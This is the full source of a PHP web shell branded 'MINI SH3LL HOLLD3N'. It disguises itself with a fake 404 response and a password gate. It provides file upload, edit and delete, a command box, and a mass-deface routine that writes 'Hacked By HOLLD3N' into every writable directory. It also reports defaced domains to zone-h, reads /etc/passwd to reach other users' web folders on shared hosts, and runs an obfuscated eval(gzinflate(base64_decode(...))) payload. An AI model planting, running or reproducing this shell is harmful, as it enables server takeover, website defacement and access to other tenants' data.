<?php 
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "mangsut#123";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?MINI SH3LL HOLLD3N'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?MINI SH3LL HOLLD3N'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>-=[MINI SH3LL HOLLD3N]=-</title>
<meta name="theme color" content="black"> </meta>
<link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">

<html>
<head>
	<title>[MINI SH3LL HOLLD3N]</title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://i.ibb.co/3BhJvN0/IMG-20200302-WA0012.jpg" style="opacity:0.5; width:200px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ Berdoa dulu</font><font color="white" face="Patrick Hand"> sebelom login ]=-</font><br>
</center>


	<form method="post">
		<input type="password" name="password" placeholder="Password">
      <input type="submit" value="MASUK!">
		<br>
		<br>
		<?php echo $_SESSIOM['forbidden']; ?>
	    </form>
	  </td>
	 </table>

<?php 

exit();
}
 ?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>[MINI SH3LL HOLLD3N]</title>
<style>
div#container{   width: 931px;   position: relative;   margin-top: 0px;   margin-left: auto;   margin-right: auto;   text-align: left;}

html {
color: white;
}
body{
	font-family: font-family: Patrick Hand;
	background-image: url("https://h.top4top.io/p_1553s84nm8.jpg");
	color:White;
	background-attachment:fixed;
	background-repeat:no-repeat;
	background-position:center;
	background-color: transparant;
	-webkit-background-size: 100% 100%;
}
a {
color: white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}

#content .first{
background-color: blue;
}
hr {
color: blue;
}
table{
border: 1px #000000 dotted;
}
textarea {
border: 1px solid white;
color: pink;
background: transparent;
}
li {
display: inline;
margin: 5px;
color: aqua;
}
.i {
color: white;
}
input { background: red; color: white; border: 1px solid blue; }
select { background: white; color: black; border: 1px solid blue; }
.aw { background: white; color: black; border: 1px solid blue; padding: 5px; width: 30%;}
</style>
</head>
</body>
<body>
<center><font size="5" color="red" face="Patrick Hand"><h2>-=[ MINI SHELL HOLLD3N ]=-</h2></font>
</center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="#00FFFF">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="white">Berhasil Mek!!!</font><br />';
}else{
echo '<font color="red">Gagal MeK Facktor Face:v!!!</font><br/>';
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=#00FFFF>$ds</font>" : "<font color=#00FF66>Masih Pink mass!</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "Disable Functions : $show_ds<br>";
echo "System : <font color=#00FFFF>".$kernel."</font><br>";
echo "<center>";
echo "<hr>";
echo "[ <a href='?'>Home</a> ]";
echo "[ <a href='?dir=$dir&to=zoneh'>Zone-h</a> ]";
echo "[ <a href='?dir=$dir&to=jumping'>Jumping</a> ]";
echo "[ <a href='?dir=$dir&to=sym'>Symlink</a> ]";
echo "[ <a href='?dir=$dir&to=mass'>Mass Depes</a> ]";
echo "[ <a href='?dir=$dir&to=cmd'>Command</a> ]";
echo "</center>";
echo "<hr>";
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='HOLLD3N'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['to'] == 'mass') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='2k.htm' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By HOLLD3N</textarea><br>
	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET['to'] == 'sym') {
echo '<hr>';
eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6H1yOT7ZHaSRBrReKUrjCt0lakAtskqCLHPmOPi8+6u2BSyv++d+fYpE4AlVbaJhWJyHnf/b583ksnnjMGPkglJoLmLAip3ZkcH77/4/D9mXVw9Ob098N3J5P3R0cn1ocuENKFTh6oxBm2W52oNwvSTKL6fpwyahOPqtDLghmN3JBnMdFSW1uJUmhWtltpbFc6zk27tT+7jFJhk4iGwWIiFzPS7b148UIr7YdJg2Wo9JqGNmEZPJfggeBcGXpHe9/BMKyjXKUcI3qbRSgr4RfOGC+OF7Pf0uwSIzhIBQ0VFwsjAMa8m6hZu/U6ik4WOQVFr5WHeUgzcPMkB8P5NcgiRkWT2W4dByqV8QJeZwvLBJLrMGKe08y20HAQ4otLq2sVVhloYfiFSBXmGaW7ZezOcD8OGZclUYvSMOFA2q2RCqaMQsDSi8wPaaYwjCkXERX+DlZtwahvFWmkkr2fej8MS87zkDMu9rZe/tzDv6E11maE+Yw+szQexTxTYMR9ls4oyPQj9QfjYxfecXfkafZ45KnoS5QPuCnxE7VPJRVP1cVCMyx0Q9vDdyemX0M+Rz0f+vgt5oIGYVJ3JAQSls+6ObFXqaAXqU0+8oySbsVybnIkT2aBCpNJwJhtbWkBILb7o0O2rG5lRD+UidDljNlcJrZ+QsM4bAwbRIl0ZldCZ/0PZ70PjgNjGGj/nTnmAUPNuUyvJxdU5cU8jWwzaLzIqFhO2xUmJpBUesRtmqq7CIvfyB8mpszhMnEEXKjS46LCPelnNEZqAImgsY9jne95XlEUbtO3S7yqRiyQ0lfXarwuU3sJVjxpOf3qZ5bGEcuI1bzKtdXRsOXV6OBpKPASPqPemrqXz6csDSc45cwCFQjMpW9NpizILq21KJsdtAxt2UOwWshlvra3h7e3t3WqPTOvpt9uKZNUl/Lk8PjELyHSMkXL0V0RWWU7gG0EnoSI/3VAhMcQER6AROQ2UREqWIQHcLE/LtEO7sEN0/M7GzHuEZUN2PSYk3VEqvEIPgckMO9dJ4usdApuXSKIA1wAvU6VTU4z8/aKg5YFrfjMVB6KRLfZs5hyXLaa7ujGgo7e0jG2vlxSjUODYlSzAiGChV1SdUB3IIcte+4huL1yzvfOPU9qhJPdWrdpaPWQIOVEdvFqqCRw9o3GHQrWhhD5+gP49AnWGL4PPc24c+MDmaYZWSPqlP3V73uxXOddBcJj6dTL7mMGIi80aTP3gucJFes8uTEQYy+arTPmEk0hNN0TQ6zyzW+VbWJoDcTfzQxzhxEHk423mEqzOb0bID0gDzXuho3wYLevwLzWq0KpFMmq50cMVBj/AMQ3XKwi/BrA1wMY3DN9Gr9rlKkmownmJZTr+5VLeIYJ/jPNIl5I4tzci9mbEFtfsGt4fYfW6PkLAbvXe/kNoLrd+mqwfgCpq0Ing2WZrcsBYzs70aAuDxxTcUXFyEsG428C7m8P/lVgV3SWY6IIGXbwQOvjY888DTTW65schfAAtZfskQ+GW37d3nbgpoPXnv5h1bj/jMASQfFwQJJTOnN9+JunWLY9q2vILjnPsHGrSlijqfDG1rAKrTw+9ZdlA+4i0URllo+iUrk4jgjeRblY4nxeLY/d7lJRk1dGZxdNray0ap9tsvpV+2x9mX2bTfZ9jX1fY//nNdYYxw2bbORF6RV+LoMmw3mmza5MplG6Bb3v4E59EwK+CbKM4yvjz2hFoYmHtQdtrvx/Nf4H')));
} elseif($_GET['to'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}  elseif($_GET['to'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="white">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="white">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Crotz" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="white">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="white">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="white">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Pilih</option>
<option value="delete">delete</option>
<option value="chmod">Chmod</option>
<option value="rename">rename</option>
<option value="edit">edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/>Â© DESSIGNER Mr.Lutfie404 FT MISTER.G</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>